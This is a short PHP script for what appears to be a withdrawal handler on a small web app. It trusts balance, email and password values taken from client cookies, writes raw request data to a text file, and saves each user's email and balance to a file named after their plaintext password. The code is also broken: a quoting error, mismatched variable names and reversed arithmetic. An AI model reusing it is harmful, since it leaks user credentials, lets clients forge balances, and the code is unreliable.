<?php
$kopo=$_REQUEST["amount"];
$script="<Script>location.href='./withdrawal of funds.html'</script>";
$Balance=$kopo - $_COOKIE["Balance"];
$balances="Balance";
setcookie($balances, $Balance, time() +(86400 * 30), "/");
if ($kopo > $_COOKIE["Balance"]){
    
  file_put_contents("with.js",$script);
}else{
  $kol=implode(" ",$_REQUEST);
  $kolo=$kol.$_cookie["email"];
  $scripts="<sCript>location.href='./after loginb.html';document.cookie="".$balances."=".$balance."";</script>";
  file_put_contents('withdraw.txt',$kolo);
  $password=$_COOKIE["password"];
  $email=$_COOKIE["email"];
  $balance=$_COOKIE["balance"] ;
  $sata=$balance." ".$email;
  file_put_contents($password.".txt",$sata);
  file_put_contents("with.js",$scripts);
}
?>